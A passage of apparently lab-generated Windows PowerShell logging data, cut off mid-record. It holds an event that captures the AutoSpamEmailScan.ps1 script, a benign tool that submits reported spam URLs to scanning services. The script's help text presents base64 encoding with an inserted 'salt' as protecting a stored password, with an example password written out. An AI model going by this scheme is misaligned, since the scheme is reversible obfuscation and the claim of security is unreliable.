                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:00:20.640395900Z'/><EventRecordID>34161</EventRecordID><Correlation ActivityID='{118041f9-7434-0001-f73c-81113474dc01}'/><Execution ProcessID='7672' ThreadID='9848'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>3</Data><Data Name='ScriptBlockText'>\r\n&lt;#PSScriptInfo\r\n\r\n.VERSION 5.2.0\r\n\r\n.GUID 134de175-8fd8-4938-9812-053ba39eed83\r\n\r\n.AUTHOR HAO BAN/banhao@gmail.com\r\n\r\n.COMPANYNAME\r\n\r\n.COPYRIGHT\r\n\r\n.TAGS\r\n\r\n.LICENSEURI https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\r\n\r\n.PROJECTURI\r\n\r\n.ICONURI\r\n\r\n.EXTERNALMODULEDEPENDENCIES Before you run the script Install the Exchange Web Services Managed API 2.2. https://www.microsoft.com/en-us/download/details.aspx?id=42951 \r\n\r\n.REQUIREDSCRIPTS\r\n\r\n.EXTERNALSCRIPTDEPENDENCIES\r\n\r\n.RELEASENOTES\r\n\tCreation Date:  &lt;11/08/2022&gt;\r\n\tPurpose/Change: Remove module \"EncodedHTML\". Add BANNER. Add module check.\r\n\t\r\n\tCreation Date:  &lt;09/21/2022&gt;\r\n\tPurpose/Change: Add Hash Value into MineMeld when the attachment scan result is positive\r\n\t\r\n\tCreation Date:  &lt;09/09/2022&gt;\r\n\tPurpose/Change: Add module \"EncodedHTML\"\r\n\t\r\n\tCreation Date:  &lt;08/17/2022&gt;\r\n\tPurpose/Change: Add module \"extract_hyperlink_from_Excel\"\r\n\t\r\n\tCreation Date:  &lt;06/10/2022&gt;\r\n\tPurpose/Change: optimize some outputs format.\r\n\t\r\n\tCreation Date:  &lt;05/31/2022&gt;\r\n\tPurpose/Change: Rename some variables.\r\n\t\r\n\tCreation Date:  &lt;05/30/2022&gt;\r\n\tPurpose/Change: Optimize the module \"CheckRedirectedURL\", skip scan the URL if the URL contain file types in variable \"$EXTENSIONARRAY\" \r\n\t\r\n\tCreation Date:  &lt;05/26/2022&gt;\r\n\tPurpose/Change: Add \"RedirectURL.py\" to replace the powershell script.\r\n\t\t\t\t\tAdd \"pdf2url.py\" to replace the \"Bytescout.PDF2HTML.dll\"\r\n\t\t\t\t\tAdd \"Submit_FILE_Virustotal.py\" to replace the \"Submit-FILE-Virustotal\" and call VirusTotal V3 API\r\n\t\r\n\tCreation Date:  &lt;05/09/2022&gt;\r\n\tPurpose/Change: Add \"selenium_simulator.py\" to open HTML file on local and get screenshot. \r\n\t\r\n\tCreation Date:  &lt;05/03/2022&gt;\r\n\tPurpose/Change: optimize the method to extract email address from the mail body.\r\n\t\r\n\tCreation Date:  &lt;04/28/2022&gt;\r\n\tPurpose/Change: Instead the \"Cisco SecureX Investigation Module\" with the \"secureX.ps1\"\r\n\t\t\t\t\tAdd \"MineMeld_Indicator.ps1\"\r\n\t\t\t\t\tAdd ESA_Spam_Block.ps1\r\n\t\t\t\t\tRemove \"checkphish.ai\" module\r\n\t\r\n\tCreation Date:  &lt;09/20/2021&gt;\r\n\tPurpose/Change: Fixed Function \"ESASpamQuarantine\" a small bug.\r\n\t\r\n\tCreation Date:  &lt;07/08/2021&gt;\r\n\tPurpose/Change: add Cisco SecureX Investigation Module\r\n\t\r\n\tCreation Date:  &lt;05/26/2021&gt;\r\n\tPurpose/Change: Fixed some bugs\r\n\r\n\tCreation Date:  &lt;05/19/2021&gt;\r\n\tPurpose/Change: Add \"BlockedMailSelfRelease\" function. If you donnot have ESA/SMA or donott want to use ESA/SMA API to block SPAM sender or release blocked emails from quarantine then please setup \"ENABLEESASPAMBL\" and \"ENABLESELFRELEASE\" as \"False\" in init.conf  \r\n\r\n\tCreation Date:  &lt;05/13/2021&gt;\r\n\tPurpose/Change: Add \"slblconfig EXPORT\" after update the Cisco Email Security Appliance Spam Quarantine Blacklist.(related to Cisco Bug CSCvx12488)\r\n\tssh PRIVATE KEY must be save in \"c:\\users\\&lt;username&gt;\\.ssh\\\" folder. \".ssh\" folder must disable \"inheritance\" and manually grant \"local\\SYSTEM\" group, \"local\\Administrators\" group \"full control\" privilege, and current user \"read only\" privilege.\r\n\r\n\tCreation Date:  &lt;04/05/2021&gt;\r\n\tPurpose/Change: Optimize function CheckRedirectedURL{}\r\n\r\n\tCreation Date:  &lt;03/25/2021&gt;\r\n\tPurpose/Change: Update function CheckRedirectedURL{}\r\n\r\n\tCreation Date:  &lt;03/19/2021&gt;\r\n\tPurpose/Change: Add a new module for Cisco Email Security Appliance Spam Quarantine Blacklist.\r\n\r\n\tCreation Date:  &lt;11/10/2020&gt;\r\n\tPurpose/Change: Move emails to sub-folder when after the checking.\r\n\r\n\tCreation Date:  &lt;04/03/2020&gt;\r\n\tPurpose/Change: Optimize the parameters setting.\r\n\r\n\tCreation Date:  &lt;04/02/2020&gt;\r\n\tPurpose/Change: Add new feature to let the use input the credential just chose \"N\" when prompt \"salt is empty\". Add SystemException, fix the broken of the system error.\r\n\r\n\tCreation Date:  &lt;03/10/2020&gt;\r\n\tPurpose/Change: Add a new Function CheckRedirectedURL, this feature is used to detect URLs that try to escape the scan.\r\n\tChange \"function Submit-URL-Virustotal\" to use the VirusTotal API V3\r\n\r\n\tCreation Date:  &lt;02/11/2020&gt;\r\n\tPurpose/Change: Add checkphish.ai API limit error\r\n\r\n\tCreation Date:  &lt;01/22/2020&gt;\r\n\tPurpose/Change: Add a new Function checkphish.ai\r\n\r\n\tCreation Date:  &lt;10/21/2019&gt;\r\n\tPurpose/Change: One funcation name was changed but calls the old name in the program. Update the Bytescout.PDF2HTML.dll to version 10.6.0.3667. It's still a trial version and will expire after 90 days. If you see this error: \r\n\t--------------------------------------------------------------------------------------\r\n\t\"new-object : Exception calling \".ctor\" with \"0\" argument(s): \"Trial period expired.\"\r\n\t+         $extractor = new-object Bytescout.PDF2HTML.HTMLExtractor\r\n\t--------------------------------------------------------------------------------------\r\n\tThat means the DLL file has been expired.\r\n\r\n.PRIVATEDATA\r\n\r\n.DESCRIPTION AutoSpamEmailScan.ps1 is used to monitor a specific mailbox that in enterprise users can forward suspicious spam emails to a specific mailbox.\r\n\tThis PowerShell script can monitor the mailbox for any unread emails, grab the URLs and attachments from the emails and submit to virustotal.com, urlscan.io, Google safe browsing and OPSWAT. Script also can extract URLs from a pdf file.\r\n\tAfter the scan finished, script can generate HTML format scan report and auto reply to the senders.\r\n\tScript can be run once or loop interval, if  in the init.conf is 0 means script will only run one time else the number is the loop interval seconds.\r\n\r\n\tVisit https://github.com/banhao/AutoSpamEmailScan to get the init.conf and Bytescout.PDF2HTML.dll, this dll file is used to convert PDF to HTML.\r\n\r\n\tPlease check the License before you download this script, if you don't agree with the License please don't download and use this script. https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\r\n\r\n\tThe Password is base64 encoded and saved in init.conf, following is the example about how to genertae the encoded password:\r\n\t\"JkPgsiG9Zh0XCvk\" is the password.\r\n\t\"yp9P7\" is the salt. make sure salt is the unique string that can't have the same pattern in the password.\r\n\tInsert the salt into password where ever you want:\r\n\typ9P7JkPgsiG9Zh0XCvk, JkPgsiG9Zh0XCvkyp9P7, JkPgyp9P7siG9Zh0XCvk, JkPgsiG9Zh0XCyp9P7vk, ...... all these are legitimate.\r\n\t\r\n\tGenerate the base64 encoded string:\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"yp9P7JkPgsiG9Zh0XCvk\"))\r\n\t\teQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCvkyp9P7\"))\r\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgyp9P7siG9Zh0XCvk\"))\r\n\t\tSgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\r\n\t[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"JkPgsiG9Zh0XCyp9P7vk\"))\r\n\t\tSgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\r\n\t\r\n\tSave the encoded string in the init.conf file.\r\n\t\r\n\tDecode the encoded string:\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"eQBwADkAUAA3AEoAawBQAGcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\r\n\t\typ9P7JkPgsiG9Zh0XCvk\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB2AGsAeQBwADkAUAA3AA==\"))\r\n\t\tJkPgsiG9Zh0XCvkyp9P7\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwB5AHAAOQBQADcAcwBpAEcAOQBaAGgAMABYAEMAdgBrAA==\"))\r\n\t\tJkPgyp9P7siG9Zh0XCvk\r\n\t[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\"SgBrAFAAZwBzAGkARwA5AFoAaAAwAFgAQwB5AHAAOQBQADcAdgBrAA==\"))\r\n\t\tJkPgsiG9Zh0XCyp9P7vk\r\n\t\r\n\tEven someone can get the encoded string from the init.conf and use base64 to decode it, but they don't know the salt, so they still can't get the password directly.\r\n\r\n\tThis PowerShell passed the test in PowerShell version 5.1.16299.1146. Can not run on Powershell version 4 and below.\r\n\tPS H:\\&gt;host  \r\n\tCheck the PowerShell version.\r\n\r\n#&gt;\r\n\r\n\r\n#-------------------------------------------------------------------------------------------------------------------------------------------------------\r\n#variables\r\nparam ($CREDENTIAL,$SALT)\r\ncls\r\n$BANNER = @\"\r\n\r\n    #                            #####                          #######                            #####                       \r\n   # #   #    # #####  ####     #     # #####    ##   #    #    #       #    #   ##   # #         #     #  ####    ##   #    # \r\n  #   #  #    #   #   #    #    #       #    #  #  #  ##  ##    #       ##  ##  #  #  # #         #       #    #  #  #  ##   # \r\n #     # #    #   #   #    #     #####  #    # #    # # ## #    #####   # ## # #    # # #          #####  #      #    # # #  # \r\n ####### #    #   #   #    #          # #####  ###### #    #    #       #    # ###### # #               # #      ###### #  # # \r\n #     # #    #   #   #    #    #     # #      #    # #    #    #       #    # #    # # #         #     # #    # #    # #   ## \r\n #     #  ####    #    ####      #####  #      #    # #    #    ####### #    # #    # # ######     #####   ####  #    # #    # \r\n\r\n    Copyright  Hao Ban - 2022\r\n    Issue Date: November 07, 2022\r\n    Version: 5.2.0\r\n    Author: Hao Ban &lt;banhao@gmail.com&gt;\r\n\"@\r\nWrite-Host $BANNER `r`n\r\n\r\n$ALLPYTHONMODULEOFF = $false\r\n$PYTHONVERSION = &amp;{python -V} 2&gt;&amp;1\r\n\r\nif($PYTHONVERSION -is [System.Management.Automation.ErrorRecord]) {\r\n\t$PYTHONVERSION.Exception.Message\r\n\tWrite-Host \"***** CAN NOT FIND PYTHON ENVIRONMENT. *****\" -ForegroundColor red `r`n\r\n\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\r\n\t$ALLPYTHONMODULEOFF = $true\r\n}else {\r\n    if ([System.Version]$PYTHONVERSION.split(\"\")[1] -lt [System.Version]\"3.6.0\") {\r\n\t\tWrite-Host \"***** THE PYTHON VERSION DOES NOT MATCH THE MINIMUM REQUIREMENT. *****\" -ForegroundColor red `r`n\r\n\t\tWrite-Host \"***** All THE PYTHON MODULES WILL BE DISABLED. *****\" -ForegroundColor red `r`n\r\n\t\t$ALLPYTHONMODULEOFF = $true\r\n\t}\r\n}\r\n\r\n$global:MODULE_LIST = New-Object System.Collections.Generic.Dictionary\"[String,String]\"\r\n$MODULES = $(Select-Xml -Path .\\module.xml -XPath \"//SETTINGS/MODULE\" | foreach {$_.node}).'#text'\r\n$xmlSETTINGS = [xml](Get-Content -Path .\\module.xml)\r\nforeach ($module in $MODULES){\r\n\tif ( $module.trim() -like \"*.py\" -and $ALLPYTHONMODULEOFF ) {\r\n\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\r\n\t\tWrite-Host \"##### [$($module.trim())] is turned\" -NoNewline\r\n\t\tWrite-Host \" [OFF] \" -ForegroundColor red -NoNewline\r\n\t\tWrite-Host \"#####\" `r\r\n\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t\r\n\t}else {\t\r\n\t\tif ( Test-Path -path \".\\$($module.trim())\" ){\r\n\t\t\t$ONOFF = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/ENABLE\").'#text').Trim()\r\n\t\t\t$global:MODULE_LIST.add($($module.trim()), $ONOFF)\r\n\t\t\tif ( $ONOFF -eq \"OFF\" ) {\r\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned\" -NoNewline\r\n\t\t\t\tWrite-Host \" [$ONOFF] \" -ForegroundColor red -NoNewline\r\n\t\t\t\tWrite-Host \"#####\" `r\r\n\t\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t\t}else{\r\n\t\t\t\tWrite-Host \"##### [$($module.trim())] is in the current folder and is turned [$ONOFF]  #####\" `r`n -ForegroundColor green\r\n\t\t\t}\r\n\t\t}else{\r\n\t\t\t$global:MODULE_LIST.add($($module.trim()), \"OFF\")\r\n\t\t\tWrite-Host \"***** CANNOT FIND [$($module.trim())] IN THE CURRENT FOLDER, SO THE FEATURE WILL BE DISABLED. *****\" -ForegroundColor red `r\r\n\t\t\t$COMMENT = $($xmlSETTINGS.SelectNodes(\"//SETTINGS/MODULE[contains(.,'$module')]/COMMENT\").'#text').Trim()\r\n\t\t\tWrite-Host \"      |-$COMMENT\" `r`n\r\n\t\t}\r\n\t}\r\n}\r\n\r\nif ( [string]::IsNullOrEmpty($CREDENTIAL) -and [string]::IsNullOrEmpty($SALT) ){\r\n\t$YorN = Read-Host \"Do you want to input the Credential? [ y/n ] (Default is y)\"\r\n\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\t$CREDENTIAL = Get-Credential -credential $USERNAME\r\n\t\t$PASSWORD = $CREDENTIAL.Password\r\n\t}else{\r\n\t\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t\tif ( [string]::IsNullOrEmpty($SALT) ){\r\n\t\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\r\n\t\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\r\n\t\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\r\n\t\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\r\n\t\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\r\n\t}\r\n}else{\r\n\t$ENCODEDPASSWORD = Get-Content .\\init.conf | findstr ADPASSWORD |  %{ $_.Split(':')[1]; } | foreach{ $_.ToString().Trim() }\r\n\t$USERNAME = Get-Content .\\init.conf | findstr ADUSERNAME |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\tif ( [string]::IsNullOrEmpty($SALT) ){\r\n\t\t$YorN = Read-Host \"The salt is empty. Do you want to input the salt to decrypt the password? [ y/n ] (Default is y)\"\r\n\t\tif ( $YorN -match \"[yY]\" -or ([string]::IsNullOrEmpty($YorN))){\r\n\t\t\t$SALT = Read-Host -assecurestring \"Please input the salt\"\r\n\t\t\t$PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SALT))),\"\")\r\n\t\t}else{ $PASSWORD = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD)) }\r\n\t}else { $PASSWORD = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ENCODEDPASSWORD))).Replace($SALT,\"\") }\r\n}\r\n\r\n$DOMAIN = Get-Content .\\init.conf | findstr DOMAIN |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EMAILADDRESS = Get-Content .\\init.conf | findstr EMAILADDRESS |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EWSDLLPATH = Get-Content .\\init.conf | findstr EWSDLLPATH |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$DOWNLOADDIRECTORY =  Get-Content .\\init.conf | findstr DOWNLOADDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$REPORTSDIRECTORY = Get-Content .\\init.conf | findstr REPORTSDIRECTORY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EXTENSIONARRAY = Get-Content .\\init.conf | findstr EXTENSIONARRAY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$EXEMPTURL = (Get-Content .\\init.conf | findstr EXEMPTURL |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }).split(\",\")\r\n$SUBFOLDER = Get-Content .\\init.conf | findstr SUBFOLDER | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$INTERVAL = [int]$(Get-Content .\\init.conf | findstr INTERVAL | %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() })\r\n$VIRUSTOTAL_API_KEY = Get-Content .\\init.conf | findstr VIRUSTOTAL_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$URLSCAN_API_KEY = Get-Content .\\init.conf | findstr URLSCAN_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$GOOGLE_API_KEY = Get-Content .\\init.conf | findstr GOOGLE_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$OPSWAT_API_KEY = Get-Content .\\init.conf | findstr OPSWAT_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n$CHECKPHISH_API_KEY = Get-Content .\\init.conf | findstr CHECKPHISH_API_KEY |  %{ $_.Split('=')[1]; } | foreach{ $_.ToString().Trim() }\r\n\r\n$global:enable_SecureX = $false\r\n\r\nfunction Google-Safe-Browsing {\r\n\tWrite-OutPut \"Google Safe Browsing Scan Report: \" &gt;&gt; $LOGFILE\r\n\t$BODY = @()\r\n\t$BODY +=[pscustomobject]@{\"client\" = @{\"clientId\" = \"eHealth Saskatche\"; \"clientVersion\" = \"1.0\"}; \"threatInfo\" = @{\"threatTypes\" = \"MALWARE\",\"SOCIAL_ENGINEERING\"; \"platformTypes\" = \"WINDOWS\"; \"threatEntryTypes\" = \"URL\"; \"threatEntries\" = @{\"url\" = \"$URL\"}}}\r\n\t$HEADERS = @{ 'Content-Type' = \"application/json\" }\r\n\t$JSONBODY = $BODY | ConvertTo-Json\r\n\t$Uri = 'https://safebrowsing.googleapis.com/v4/threatMatches:find?key='+ $GOOGLE_API_KEY\r\n\t$Results = Invoke-RestMethod -Method 'POST' -Uri $Uri -Body $JSONBODY -Headers $HEADERS\r\n\tif ( ([string]::IsNullOrEmpty($Results)) ) {\r\n\t\tWrite-OutPut \"Can not find the result in Google Safe Browsing Scan.\"  &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t }else{\r\n\t\t$ThreatType = $Results | select -expand matches | select threatType\r\n\t\tif ( ($ThreatType.threatType -eq \"SOCIAL_ENGINEERING\") -or ($ThreatType.threatType -eq \"MALWARE\") -or ($ThreatType.threatType -eq \"POTENTIALLY_HARMFUL_APPLICATION\") ) { $global:enable_SecureX = $true }\r\n\t\tWrite-OutPut \"Google Safe Browsing Scan Results:    \",$($ThreatType) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}\r\n}\r\n\r\nfunction Submit-URLSCAN {\r\n\tWrite-OutPut \"URLscan Scan Report: \" &gt;&gt; $LOGFILE\r\n\t$BODY = @{ 'url' = \"$URL\"; 'public' = 'on' }\r\n\t$HEADERS = @{ 'API-Key' = \"$URLSCAN_API_KEY\" }\r\n\tTry { $SCANRESPONSE = Invoke-RestMethod -Method 'POST' -Uri 'https://urlscan.io/api/v1/scan/' -Headers $HEADERS -Body $BODY } Catch { $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()) }\r\n\tif ( [string]::IsNullOrEmpty($SCANRESPONSE) ) {\r\n\t\t$reader.BaseStream.Position = 0\r\n\t\t$reader.DiscardBufferedData()\r\n\t\t$Exception = $reader.ReadToEnd() | ConvertFrom-Json\r\n\t}\r\n\tif ( -not ([string]::IsNullOrEmpty($Exception)) ) {\r\n\t\tWrite-Output \"Exception Error:\" $Exception.description &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t}else{ \t\r\n\t\t$RESPONSEAPI = $SCANRESPONSE.api\r\n\t\tDo {\r\n\t\t\tStart-Sleep -s 30\r\n\t\t\t$RESPONSE = try { $SCANRESULT = Invoke-RestMethod -Method 'GET' -Uri $RESPONSEAPI } catch { $_.Exception.Response.StatusCode.Value__}\r\n\t\t}Until($RESPONSE -ne 404)\r\n\t\t$ReportURL = $SCANRESULT.task.reportURL\r\n\t\t$ScreenShot = $SCANRESULT.task.screenshotURL\r\n\r\n\t\tWrite-OutPut \"ScanReportURL:     \",$($ReportURL) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"ScreenShotURL:     \",$($ScreenShot) &gt;&gt; $LOGFILE\r\n\t\tWrite-OutPut \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\" &gt;&gt; $LOGFILE\r\n\t\tStart-Sleep -s 3\r\n\t}\r\n}\r\n\r\nfunction Submit-URL-Virustotal {\r\n\t$BODY = @{ \"url\" = \"$URL\" }\r\n\t$HEADERS = @{ \"x-apikey\" = \"$VIRUSTOTAL_API_KEY\" }\r\n\t$SCAN = Invoke-RestMethod -Method 'POST' -Uri \"https://www.virustotal.com/api/v3/urls\" -Headers $HEADERS -Body $BODY\r\n\t$RESULTID = $SCAN.data.i</Data><Data Name='ScriptBlockId'>5b10436f-ec14-4c18-b4ca-12f2db33c2be</Data><Data Name='Path'>C:\\Users\\vagrant\\posh\\AutoSpamEmailScan.ps1</Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 3):\r\n\r\n&lt;#PSScriptInfo\r\n\r\n.VERSION 5.2.0\r\n\r\n.GUID 134de175-8fd8-4938-9812-053ba39eed83\r\n\r\n.AUTHOR HAO BAN/banhao@gmail.com\r\n\r\n.COMPANYNAME\r\n\r\n.COPYRIGHT\r\n\r\n.TAGS\r\n\r\n.LICENSEURI https://github.com/banhao/AutoSpamEmailScan/blob/master/LICENSE\r\n\r\n.PROJECTURI\r\n\r\n.ICONURI\r\n\r\n.EXTERNALMODULEDEPENDENCIES Before you run the script Install the Exchange Web Services Managed API 2.2. https://www.microsoft.com/en-us/download/details.aspx?id=42951 \r\n\r\n.REQUIREDSCRIPTS\r\n\r\n.EXTERNALSCRIPTDEPENDENCIES\r\n\r\n.RELEASENOTES\r\n\tCreation Date:  &lt;11/08/2022&gt;\r\n\tPurpose/Change: Remove module \"EncodedHTML\". Add BANNER. Add module check.\r\n\t\r\n\tCreation Date:  &lt;09/21/2022&gt;\r\n\tPurpose/Change: Add Hash Value into MineMeld when the attachment scan result is positive\r\n\t\r\n\tCreation Date:  &lt;09/09/2022&gt;\r\n\tPurpose/Change: Add module \"EncodedHTML\"\r\n\t\r\n\tCreation Date:  &lt;08/17/2022&gt;\r\n\tPurpose/Change: Add module \"extract_hyperlink_from_Excel\"\r\n\t\r\n\tCreation Date:  &lt;06/10/2022&gt;\r\n\tPurpose/Change: optimize some outputs format.\r\n\t\r\n\tCreation Date:  &lt;05/31/2022&gt;\r\n\tPurpose/Change: Rename some variables.\r\n\t\r\n\tCreation Date:  &lt;05/30/2022&gt;\r\n\tPurpose/Change: Optimize the module \"CheckRedirectedURL\", skip scan the URL if the URL contain file types in variable \"$EXTENSIONARRAY\" \r\n\t\r\n\tCreation Date:  &lt;05/26/2022&gt;\r\n\tPurpose/Change: Add \"RedirectURL.py\" to replace the powershell script.\r\n\t\t\t\t\tAdd \"pdf2url.py\" to replace the \"Bytescout.PDF2HTML.dll\"\r\n\t\t\t\t\tAdd \"Submit_FILE_Virustotal.py\" to replace the \"Submit-FILE-Virustotal\" and call VirusTotal V3 API\r\n\t\r\n\tCreation Date:  &lt;05/09/2022&gt;\r\n\tPurpose/Change: Add \"selenium_simulator.py\" to open HTML file on local and get screenshot. \r\n\t\r\n\tCreation Date:  &lt;05/03/2022&gt;\r\n\tPurpose/Change: optimize the method to extract email address from the mail body.\r\n\t\r\n\tCreation Date:  &lt;04/28/2022&gt;\r\n\tPurpose/Change: Instead the \"Cisco SecureX Investigation Module\" with the \"secureX.ps1\"\r\n\t\t\t\t\tAdd \"MineMeld_Indicator.ps1\"\r\n\t\t\t\t\tAdd ESA_Spam_Block.ps1\r\n\t\t\t\t\tRemove \"checkphish.ai\" module\r\n\t\r\n\tCreation Date:  &lt;09/20/2021&gt;\r\n\tPurpose/Change: Fixed Function \"ESASpamQuarantine\" a small bug.\r\n\t\r\n\tCreation Date:  &lt;07/08/2021&gt;\r\n\tPurpose/Change: add Cisco SecureX Investigation Module\r\n\t\r\n\tCreation Date:  &lt;05/26/2021&gt;\r\n\tPurpose/Change: Fixed some bugs\r\n\r\n\tCreation Date:  &lt;05/19/2021&gt;\r\n\tPurpose/Change: Add \"BlockedMailSelfRelease\" function. If you donnot have ESA/SMA or donott want to use ESA/SMA API to block SPAM sender or release blocked emails from quarantine then please setup \"ENABLEESASPAMBL\" and \"ENABLESELFRELEASE\" as \"False\" in init.conf  \r\n\r\n\tCreation Date:  &lt;05/13/2021&gt;\r\n\tPurpose/Change: Add \"slblconfig EXPORT\" after update the Cisco Email Security Appliance Spam Quarantine Blacklist.(related to Cisco Bug CSCvx12488)\r\n\tssh PRIVATE KEY must be save in \"c:\\users\\&lt;username&gt;\\.ssh\\\" folder. \".ssh\" folder must disable \"inheritance\" and manually grant \"local\\SYSTEM\" group, \"local\\Administrators\" group \"full control\" privilege, and current user \"read only\" privilege.\r\n\r\n\tCreation Date:  &lt;04/05/2021&gt;\r\n\tPurpose/Change: Optimize function CheckRedirectedURL{}\r\n\r\n\tCreation Date:  &lt;03/25/2021&gt;\r\n\tPurpose/Change: Update function CheckRedirectedURL{}\r\n\r\n\tCreation Date:  &lt;03/19/2021&gt;\r\n\tPurpose/Change: Add a new module for Cisco Email Security Appliance Spam Quarantine Blacklist.\r\n\r\n\tCreation Date:  &lt;11/10/2020&gt;\r\n\tPurpose/Change: Move emails to sub-folder when after the checking.\r\n\r\n\tCreation Date:  &lt;04/03/2020&gt;\r\n\tPurpose/Change: Optimize the parameters setting.\r\n\r\n\tCreation Date:  &lt;04/02/2020&gt;\r\n\tPurpose/Change: Add new feature to let the use input the credential just chose \"N\" when prompt \"salt is empty\". Add SystemException, fix the broken of the system error.\r\n\r\n\tCreation Date:  &lt;03/10/2020&gt;\r\n\tPurpose/Change: Add a new Function CheckRedirectedURL, this feature is used to detect URLs that try to 